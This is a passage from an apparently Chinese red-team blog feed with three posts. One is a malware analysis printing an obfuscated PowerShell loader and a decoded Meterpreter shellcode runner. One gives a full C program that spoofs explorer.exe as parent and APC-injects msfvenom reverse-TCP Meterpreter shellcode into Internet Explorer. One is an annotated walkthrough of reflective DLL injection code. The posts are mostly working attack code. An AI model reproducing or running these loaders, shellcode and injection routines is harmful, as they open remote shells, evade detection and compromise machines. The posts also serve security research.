System.IO.MemoryStream(,[System.Convert]::FromBase64String(&#39;&#39;H4sIAFh/q18CA7VWbW+bSBD+nEj9D6iyZFAcg1M354tU6QBDjGtSE2zs2GedCCyw9bL4YIlNev3vN2vjNFXTqj3pEBL7Mi/PPDO7Q1TSgOGMCqwnfHp1ejL2cz8VxEbsPbaEBjId6eQElhtVfhMK7wRxqW42/Sz1MV1dXellniPKDvP2NWJqUaD0nmBUiJLwjzBLUI7OP9x/RAETPgmNv9rXJLv3SS1W6X6QIOFcpSHfG2WBz6G03Q3BTGz++WdTWp53Vm3j79Inhdh0q4KhtB0S0pSEzxJ3OKk2SGzaOMizIotYe4bpm4v2lBZ+hG7A2gOyEUuysGhKEAW8OWJlToV9PNzAYVtswnCcZ4EahjkqimZLWHLTy9XqD3FZ+70tKcMpaluUoTzbuCh/wAEq2gOfhgTdomgFWi7LMY1XkgRiD9kaiQ1aEtISfsWMeIO2R9Z+Vkl8rgRSY5ZLLcjjC3HaWVgSdNBsvgCU516Cp84/EPf51emr0+hYKVvreaXA6GS5HyOAJo6zAu+l3glKS7DBic+yvIJpY5KXSFo9ESs04p3f+r565ygLkqnnXV7A2tLLcLgCnTqbjRQhzeUb3y/LPoowRf2K+ikOjpUnvsQxigjah9g+it0ALLFZb6CwjwiKfcZZ46n+Rs1IMXvS1UpMQpSrAeSpAFSQQulrMIdEiE2L2igFkg5zqL1GBPWOjtJ1jVdH73wOQk2d+EXREsYlHLigJbjIJyhsCSotcL2llizbD5tf4NolYTjwC3Y0t5KeiKwd6hktWF4GkDgIfuJuUIB9wrloCQMcIq1ycXx03HyRCd0nBM4BWHqATMAKZ8BlvBxywMhTL7VdxKx0Q1AKIvuTbxI/hnNeF/u+fPwYhc1vEB6r+VC6nIwjC8/wQYZdkrGW4OGcwQ3Cid0X0n/y/+zuOCDRc1QnQzwekaVWMV7aDZrymqxp2ZOQMyDAzLNU8wt02T1cE+Jr2cD9t+N+9qjCY5i3jqe5U29h2eGQuBZz7ww8miaJhTtWDPNqasRjpmzeTyaDodsfqHl/l0SqVVjGQKucjqYGA/ybN9SmU9DD+sj5uLPUUEvjeXynb61xMrfAkT6KrRi+mpUEmrJQYk0x9ZGrJQZW1Nh1Bk63s7DkHtHwo2u56mD25O/Jj9HtDua7iXpjD9XE/BCanQtzr7/m+ov19ahv7OcBnzt3hYEN8GOYd46XoJm30WaGuXC8jRWfbWPHG8ldM9Fg3cK70caV4el0hg80fLRJ79EGuI63GGK0sGJUxaqjqu4dJe79Vlc1M9i+T3brqTmFtfXEojvnfmOH1d1A/t2zMdpkqmOoqkngTKaqv+3LnVn23vHeOlND2VVTZbc1PspbAw+36/o7vb68jOWoO5Y916IDP9EAbzXsrvHwDPZS31PuItnj/OlrKj/SObkc2ntOIR4HdDDnzI9vQe+gozJqzWXZi+VYjYhnxT0nnmf0wl+D7VmsAkKIEXIdDS07AKwEr6dnc7kzBTxKOtwpHGs67IG9i/ULNt0EuA0XvqpxHNrsOlNn6+tLveqNbYjD64BN6pWT2QBsAuZy3eM0Q377rk6vXWt+Ed7favJZeOfH2sINIr03mmHvQfZe8yMAZ6BRPG67nWfF/b3GZPt5kfgEih46zvGqMbPcrLvIOMNcQxThv2ONcooI9G3o7MfDqhKSBbyDQbeB3nnoaLzBTmH45uLFkSQ8CUpf+tpx6epqAQjh7NO0PUI0ZklL2b1RFGhTyq6rQIA/H5OebSpomGmLN7kDJwfDZG9Y4pdBI5rNw/+TqfoCSuAT/pipL2s/2P0p9pRWHe03618v/BKbvxj3zMcM5Fy4QAk6tPCXwq9r4tkPDk8I5DyqH/6H+qFk5zfw3/Pq9F/CXRToCQsAAA==&#39;&#39;))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))&#39;;$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle=&#39;Hidden&#39;;$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);</code></pre><p>$s.Arguments解析得到code<br><img src="https://s1.ax1x.com/2020/11/11/BjRqNd.png" alt=""></p><pre><code class="powershell">function t8 {    Param ($gVz, $eFQ)            $yrNd = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split(&#39;\\&#39;)[-1].Equals(&#39;System.dll&#39;) }).GetType(&#39;Microsoft.Win32.UnsafeNativeMethods&#39;)    return $yrNd.GetMethod(&#39;GetProcAddress&#39;, [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($yrNd.GetMethod(&#39;GetModuleHandle&#39;)).Invoke($null, @($gVz)))), $eFQ))}function wI {    Param (        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $gxa,        [Parameter(Position = 1)] [Type] $mVV62 = [Void]    )    $meeBS = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(&#39;ReflectedDelegate&#39;)), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule(&#39;InMemoryModule&#39;, $false).DefineType(&#39;MyDelegateType&#39;, &#39;Class, Public, Sealed, AnsiClass, AutoClass&#39;, [System.MulticastDelegate])    $meeBS.DefineConstructor(&#39;RTSpecialName, HideBySig, Public&#39;, [System.Reflection.CallingConventions]::Standard, $gxa).SetImplementationFlags(&#39;Runtime, Managed&#39;)    $meeBS.DefineMethod(&#39;Invoke&#39;, &#39;Public, HideBySig, NewSlot, Virtual&#39;, $mVV62, $gxa).SetImplementationFlags(&#39;Runtime, Managed&#39;)    return $meeBS.CreateType()}[Byte[]]$nm = [System.Convert]::FromBase64String(&quot;/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCABFcwKhxkUFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V&quot;)$szw41 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((t8 kernel32.dll VirtualAlloc), (wI @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $nm.Length,0x3000, 0x40)[System.Runtime.InteropServices.Marshal]::Copy($nm, 0, $szw41, $nm.length)$fWXd = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((t8 kernel32.dll CreateThread), (wI @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$szw41,[IntPtr]::Zero,0,[IntPtr]::Zero)[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((t8 kernel32.dll WaitForSingleObject), (wI @([IntPtr], [Int32]))).Invoke($fWXd,0xffffffff) | Out-Null</code></pre><p>base64拿去Extract-IP-From-Meterpreter-ShellCode.exe查连接的ip和port<br><img src="https://s1.ax1x.com/2020/11/11/BjWl59.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这是PCsXcetra计划在2019年的Derbycon演讲中发布的一组工具，用于快捷的分析一下shellcode或者powershell/混淆解码等&lt;br&gt;仓库地址：&lt;a href=&quot;https://github.com/PCsXcetra/DerbyCon-2019Fi</summary>
      
    
    
    
    
    <category term="恶意分析" scheme="http://422926799.github.io/tags/恶意分析/"/>
    
  </entry>
  
  <entry>
    <title>父进程伪造</title>
    <link href="http://422926799.github.io/posts/d0aae8a6.html"/>
    <id>http://422926799.github.io/posts/d0aae8a6.html</id>
    <published>2020-10-23T06:27:16.000Z</published>
    <updated>2020-10-23T06:52:52.254Z</updated>
    
    <content type="html"><![CDATA[<p>伪造父进程的关键点：</p><pre><code>1. 寻找explorer.exe的pid，打开文件管理器的进程获取句柄 （寻找你要伪造进程的PID）2. 初始化指定的属性列表以创建进程和线程3. 设置进程属性</code></pre><p>关键函数主要是:</p><ul><li>OpenProcess</li><li>InitializeProcThreadAttributeList</li><li>CreateProcess</li></ul><p>还有个重要的结构体:STARTUPINFOEXA<br><a href="https://docs.microsoft.com/zh-cn/windows/win32/api/winbase/ns-winbase-startupinfoexa" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/windows/win32/api/winbase/ns-winbase-startupinfoexa</a><br>STARTUPINFOEXA结构体，微软文档定义如下：</p><pre><code class="c">typedef struct _STARTUPINFOEXA {  STARTUPINFOA                 StartupInfo;  LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList;} STARTUPINFOEXA, *LPSTARTUPINFOEXA;</code></pre><p><img src="https://s1.ax1x.com/2020/10/23/BAYZFS.png" alt="参数"></p><p>InitializeProcThreadAttributeList用于初始化指定的属性列表以创建进程和线程<br><a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-initializeprocthreadattributelist" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-initializeprocthreadattributelist</a></p><pre><code class="c">BOOL InitializeProcThreadAttributeList(  LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,  DWORD                        dwAttributeCount,  DWORD                        dwFlags,  PSIZE_T                      lpSize);</code></pre><p><img src="https://s1.ax1x.com/2020/10/23/BAYUSJ.png" alt="参数"></p><p>父进程伪造部分代码</p><pre><code class="c">STARTUPINFOEXA sInfoEX;PROCESS_INFORMATION pInfo;SIZE_T sizeT;HANDLE expHandle = OpenProcess(PROCESS_ALL_ACCESS, false, getParentProcessID()); //打开explorer进程获取当前进程所有权限ZeroMemory(&amp;sInfoEX, sizeof(STARTUPINFOEXA)); //用0填充数组InitializeProcThreadAttributeList(NULL, 1, 0, &amp;sizeT); //第一次设置属性的数量sInfoEX.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, sizeT); //设置进程属性InitializeProcThreadAttributeList(sInfoEX.lpAttributeList, 1, 0, &amp;sizeT);UpdateProcThreadAttribute(sInfoEX.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &amp;expHandle, sizeof(HANDLE), NULL, NULL); //更新用于进程和线程创建的属性列表中的指定属性。sInfoEX.StartupInfo.cb = sizeof(STARTUPINFOEXA);CreateProcessA(&quot;C:\\Program Files\\internet explorer\\iexplore.exe&quot;, NULL, NULL, NULL, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, reinterpret_cast&lt;LPSTARTUPINFOA&gt;(&amp;sInfoEX), &amp;pInfo);</code></pre><p>getParentProcessID函数用于寻找要伪造父进程pid</p><pre><code class="c">DWORD getParentProcessID() { //返回explorer.exe的pid    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);    PROCESSENTRY32 process = { 0 };    process.dwSize = sizeof(process);    if (Process32First(snapshot, &amp;process)) {        do {            //If you want to another process as parent change here            if (!wcscmp(process.szExeFile, L&quot;explorer.exe&quot;))                break;        } while (Process32Next(snapshot, &amp;process));    }    CloseHandle(snapshot);    return process.th32ProcessID;}</code></pre><p>(使用APC的方式执行shellcode)<br>完整代码如下</p><pre><code class="c">#include &quot;stdafx.h&quot;#include &lt;windows.h&gt;#include &lt;TlHelp32.h&gt;#include &lt;iostream&gt;DWORD getParentProcessID() { //返回explorer.exe的pid    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);    PROCESSENTRY32 process = { 0 };    process.dwSize = sizeof(process);    if (Process32First(snapshot, &amp;process)) {        do {            //If you want to another process as parent change here            if (!wcscmp(process.szExeFile, L&quot;explorer.exe&quot;))                break;        } while (Process32Next(snapshot, &amp;process));    }    CloseHandle(snapshot);    return process.th32ProcessID;}int main() {    //Shellcode, for example; msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x EXITFUNC=thread -f c    unsigned char shellCode[] =        &quot;\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52&quot;        &quot;\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48&quot;        &quot;\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9&quot;        &quot;\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&quot;        &quot;\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48&quot;        &quot;\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b&quot;        &quot;\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b&quot;        &quot;\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41&quot;        &quot;\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1&quot;        &quot;\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45&quot;        &quot;\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b&quot;        &quot;\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01&quot;        &quot;\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48&quot;        &quot;\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9&quot;        &quot;\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00\x00&quot;        &quot;\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5&quot;        &quot;\x49\xbc\x02\x00\x11\x5c\xc0\xa8\x71\x91\x41\x54\x49\x89\xe4&quot;        &quot;\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68&quot;        &quot;\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x6a\x0a&quot;        &quot;\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89&quot;        &quot;\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5&quot;        &quot;\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba&quot;        &quot;\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5&quot;        &quot;\xe8\x93\x00\x00\x00\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9&quot;        &quot;\x6a\x04\x41\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5&quot;        &quot;\x83\xf8\x00\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41&quot;        &quot;\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41&quot;        &quot;\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31&quot;        &quot;\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8&quot;        &quot;\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68\x00\x40&quot;        &quot;\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f\x30\xff\xd5&quot;        &quot;\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49\xff\xce\xe9\x3c&quot;        &quot;\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xb4\x41&quot;        &quot;\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2\xf0\xb5\xa2\x56\xff\xd5&quot;;    STARTUPINFOEXA sInfoEX;    PROCESS_INFORMATION pInfo;    SIZE_T sizeT;    HANDLE expHandle = OpenProcess(PROCESS_ALL_ACCESS, false, getParentProcessID()); //打开explorer进程获取当前进程所有权限    ZeroMemory(&amp;sInfoEX, sizeof(STARTUPINFOEXA)); //用0填充数组    InitializeProcThreadAttributeList(NULL, 1, 0, &amp;sizeT); //初始化指定的属性列表以创建进程和线程    sInfoEX.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, sizeT); //设置进程属性并从堆中分配内存    InitializeProcThreadAttributeList(sInfoEX.lpAttributeList, 1, 0, &amp;sizeT);    UpdateProcThreadAttribute(sInfoEX.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &amp;expHandle, sizeof(HANDLE), NULL, NULL); //更新用于进程和线程创建的属性列表中的指定属性。    sInfoEX.StartupInfo.cb = sizeof(STARTUPINFOEXA);    CreateProcessA(&quot;C:\\Program Files\\internet explorer\\iexplore.exe&quot;, NULL, NULL, NULL, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, reinterpret_cast&lt;LPSTARTUPINFOA&gt;(&amp;sInfoEX), &amp;pInfo);    LPVOID lpBaseAddress = (LPVOID)VirtualAllocEx(pInfo.hProcess, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); //分配内存    SIZE_T *lpNumberOfBytesWritten = 0;    BOOL resWPM = WriteProcessMemory(pInfo.hProcess, lpBaseAddress, (LPVOID)shellCode, sizeof(shellCode), lpNumberOfBytesWritten); //写入内存    QueueUserAPC((PAPCFUNC)lpBaseAddress, pInfo.hThread, NULL); //APC调用    ResumeThread(pInfo.hThread); //启动线程    CloseHandle(pInfo.hThread); //关闭线程    return 0;}</code></pre><p>效果如下<br><img src="https://s1.ax1x.com/2020/10/23/BANyxH.png" alt="父进程是explorer.exe"></p><p><img src="https://s1.ax1x.com/2020/10/23/BANcMd.png" alt="通信"></p><p><img src="https://s1.ax1x.com/2020/10/23/BANqLn.png" alt="meterpreter"></p><p>参考链接:<br><a href="https://xz.aliyun.com/t/8387" target="_blank" rel="noopener">https://xz.aliyun.com/t/8387</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;伪造父进程的关键点：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1. 寻找explorer.exe的pid，打开文件管理器的进程获取句柄 （寻找你要伪造进程的PID）
2. 初始化指定的属性列表以创建进程和线程
3. 设置进程属性
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;关键函数主要是:&lt;/p</summary>
      
    
    
    
    
    <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
    
  </entry>
  
  <entry>
    <title>反射DLL注入研究</title>
    <link href="http://422926799.github.io/posts/907443e1.html"/>
    <id>http://422926799.github.io/posts/907443e1.html</id>
    <published>2020-10-19T05:43:45.000Z</published>
    <updated>2020-10-19T06:07:58.581Z</updated>
    
    <content type="html"><![CDATA[<p>代码来源于:<a href="https://github.com/stephenfewer/ReflectiveDLLInjection" target="_blank" rel="noopener">https://github.com/stephenfewer/ReflectiveDLLInjection</a></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>主要文件inject.c<br><img src="https://s1.ax1x.com/2020/10/19/0vb9Gq.png" alt=""></p><p>code如下</p><pre><code class="C">#define WIN32_LEAN_AND_MEAN#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &quot;LoadLibraryR.h&quot;#pragma comment(lib,&quot;Advapi32.lib&quot;)#define BREAK_WITH_ERROR( e ) { printf( &quot;[-] %s. Error=%d&quot;, e, GetLastError() ); break; }// Simple app to inject a reflective DLL into a process vis its process ID.int main( int argc, char * argv[] ){    HANDLE hFile          = NULL;    HANDLE hModule        = NULL;    HANDLE hProcess       = NULL;    HANDLE hToken         = NULL;    LPVOID lpBuffer       = NULL;    DWORD dwLength        = 0;    DWORD dwBytesRead     = 0;    DWORD dwProcessId     = 0;    TOKEN_PRIVILEGES priv = {0};#ifdef WIN_X64    char * cpDllFile  = &quot;reflective_dll.x64.dll&quot;;#else#ifdef WIN_X86    char * cpDllFile  = &quot;reflective_dll.dll&quot;;#else WIN_ARM    char * cpDllFile  = &quot;reflective_dll.arm.dll&quot;;#endif#endif    do    {        // Usage: inject.exe [pid] [dll_file]        if( argc == 1 )            dwProcessId = GetCurrentProcessId();        else            dwProcessId = atoi( argv[1] );        if( argc &gt;= 3 )            cpDllFile = argv[2];        hFile = CreateFileA( cpDllFile, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL ); //创建dll或读取dll        if( hFile == INVALID_HANDLE_VALUE )            BREAK_WITH_ERROR( &quot;Failed to open the DLL file&quot; );        dwLength = GetFileSize( hFile, NULL ); //获取文件大小        if( dwLength == INVALID_FILE_SIZE || dwLength == 0 )            BREAK_WITH_ERROR( &quot;Failed to get the DLL file size&quot; );        lpBuffer = HeapAlloc( GetProcessHeap(), 0, dwLength ); //从堆分配一块内存 (GetProcessHeap() 检索到调用进程的默认堆的句柄)        if( !lpBuffer )            BREAK_WITH_ERROR( &quot;Failed to get the DLL file size&quot; );        if( ReadFile( hFile, lpBuffer, dwLength, &amp;dwBytesRead, NULL ) == FALSE ) //读取文件            BREAK_WITH_ERROR( &quot;Failed to alloc a buffer!&quot; );        if( OpenProcessToken( GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken ) ) //获取当前token句柄        {            priv.PrivilegeCount           = 1;            priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;            if( LookupPrivilegeValue( NULL, SE_DEBUG_NAME, &amp;priv.Privileges[0].Luid ) )                AdjustTokenPrivileges( hToken, FALSE, &amp;priv, 0, NULL, NULL );            CloseHandle( hToken );        }        hProcess = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwProcessId );        if( !hProcess )            BREAK_WITH_ERROR( &quot;Failed to open the target process&quot; );        hModule = LoadRemoteLibraryR( hProcess, lpBuffer, dwLength, NULL ); //hProcess=&gt;进程句柄，lpBuffer=&gt;堆内存空间，dwlength=&gt;dll文件大小        if( !hModule )            BREAK_WITH_ERROR( &quot;Failed to inject the DLL&quot; );        printf( &quot;[+] Injected the &#39;%s&#39; DLL into process %d.&quot;, cpDllFile, dwProcessId );        WaitForSingleObject( hModule, -1 );    } while( 0 );    if( lpBuffer )        HeapFree( GetProcessHeap(), 0, lpBuffer );    if( hProcess )        CloseHandle( hProcess );    return 0;}</code></pre><p>整个流程如下：</p><ul><li>首先判断命令行参数总数量是否只有一个,如果命令行参数大于或等于三，则dwProcessId为指定PID<ul><li>dwProcessId为当前进程PID</li></ul></li><li>CreateFileA读取对应的DLL</li><li>GetFileSize获取DLL文件大小</li><li>HeapAlloc从堆分配一块内存 （这里使用GetProcessHeap，检索到调用进程的默认堆的句柄）</li><li>ReadFile读取DLL</li><li>OpenProcessToken当前TOKEN</li><li>OpenProcess打开进程</li><li>调用LoadLibraryR.c里的LoadRemoteLibrary函数dll注入<ul><li>GetReflectiveLoaderOffset返回对应PE位数的地址</li><li>VirtualAllocEx分配内存</li><li>WriteProcessMemory内存数据写入</li><li>CreateRemoteThread创建远程进程</li></ul></li></ul><p>LoadRemoteLibraryR</p><pre><code class="C">HANDLE WINAPI LoadRemoteLibraryR( HANDLE hProcess, LPVOID lpBuffer, DWORD dwLength, LPVOID lpParameter ) //hProcess=&gt;进程句柄，lpBuffer=&gt;堆内存空间，dwlength=&gt;dll文件大小{    BOOL bSuccess                             = FALSE;    LPVOID lpRemoteLibraryBuffer              = NULL;    LPTHREAD_START_ROUTINE lpReflectiveLoader = NULL;    HANDLE hThread                            = NULL;    DWORD dwReflectiveLoaderOffset            = 0;    DWORD dwThreadId                          = 0;    __try    {        do        {            if( !hProcess  || !lpBuffer || !dwLength )                break;            // check if the library has a ReflectiveLoader...            dwReflectiveLoaderOffset = GetReflectiveLoaderOffset( lpBuffer ); //自定义的GetReflectiveLoaderOffset函数            if( !dwReflectiveLoaderOffset )                break;            // alloc memory (RWX) in the host process for the image...            lpRemoteLibraryBuffer = VirtualAllocEx( hProcess, NULL, dwLength, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );             if( !lpRemoteLibraryBuffer )                break;            // write the image into the host process...            if( !WriteProcessMemory( hProcess, lpRemoteLibraryBuffer, lpBuffer, dwLength, NULL ) ) //写入内存                break;            // add the offset to ReflectiveLoader() to the remote library address...            lpReflectiveLoader = (LPTHREAD_START_ROUTINE)( (ULONG_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset );            // create a remote thread in the host process to call the ReflectiveLoader!            hThread = CreateRemoteThread( hProcess, NULL, 1024*1024, lpReflectiveLoader, lpParameter, (DWORD)NULL, &amp;dwThreadId ); //创建远程线程        } while( 0 );    }    __except( EXCEPTION_EXECUTE_HANDLER )    {        hThread = NULL;    }    return hThread;}</code></pre><p>GetReflectiveLoaderOffset函数 （返回对应的位数和地址）</p><pre><code class="c">DWORD GetReflectiveLoaderOffset( VOID * lpReflectiveDllBuffer ){    UINT_PTR uiBaseAddress   = 0;    UINT_PTR uiExportDir     = 0;    UINT_PTR uiNameArray     = 0;    UINT_PTR uiAddressArray  = 0;    UINT_PTR uiNameOrdinals  = 0;    DWORD dwCounter          = 0;#ifdef WIN_X64    DWORD dwCompiledArch = 2;#else    // This will catch Win32 and WinRT.    DWORD dwCompiledArch = 1;#endif    uiBaseAddress = (UINT_PTR)lpReflectiveDllBuffer;    // get the File Offset of the modules NT Header    uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)-&gt;e_lfanew;    // currenlty we can only process a PE file which is the same type as the one this fuction has      // been compiled as, due to various offset in the PE structures being defined at compile time.    if( ((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.Magic == 0x010B ) // PE32    {        if( dwCompiledArch != 1 )            return 0;    }    else if( ((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.Magic == 0x020B ) // PE64    {        if( dwCompiledArch != 2 )            return 0;    }    else    {        return 0;    }    // uiNameArray = the address of the modules export directory entry    uiNameArray = (UINT_PTR)&amp;((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];    // get the File Offset of the export directory    uiExportDir = uiBaseAddress + Rva2Offset( ((PIMAGE_DATA_DIRECTORY)uiNameArray)-&gt;VirtualAddress, uiBaseAddress );    // get the File Offset for the array of name pointers    uiNameArray = uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfNames, uiBaseAddress );    // get the File Offset for the array of addresses    uiAddressArray = uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfFunctions, uiBaseAddress );    // get the File Offset for the array of name ordinals    uiNameOrdinals = uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfNameOrdinals, uiBaseAddress );        // get a counter for the number of exported functions...    dwCounter = ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;NumberOfNames;    // loop through all the exported functions to find the ReflectiveLoader    while( dwCounter-- )    {        char * cpExportedFunctionName = (char *)(uiBaseAddress + Rva2Offset( DEREF_32( uiNameArray ), uiBaseAddress ));        if( strstr( cpExportedFunctionName, &quot;ReflectiveLoader&quot; ) != NULL )        {            // get the File Offset for the array of addresses            uiAddressArray = uiBaseAddress + Rva2Offset( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfFunctions, uiBaseAddress );                // use the functions name ordinal as an index into the array of name pointers            uiAddressArray += ( DEREF_16( uiNameOrdinals ) * sizeof(DWORD) );            // return the File Offset to the ReflectiveLoader() functions code...            return Rva2Offset( DEREF_32( uiAddressArray ), uiBaseAddress );        }        // get the next exported function name        uiNameArray += sizeof(DWORD);        // get the next exported function name ordinal        uiNameOrdinals += sizeof(WORD);    }    return 0;}</code></pre><p><img src="https://s1.ax1x.com/2020/10/19/0vq59I.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;代码来源于:&lt;a href=&quot;https://github.com/stephenfewer/ReflectiveDLLInjection&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/stephenfewer/Ref</summary>
      
    
    
    
    
    <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
    
  </entry>
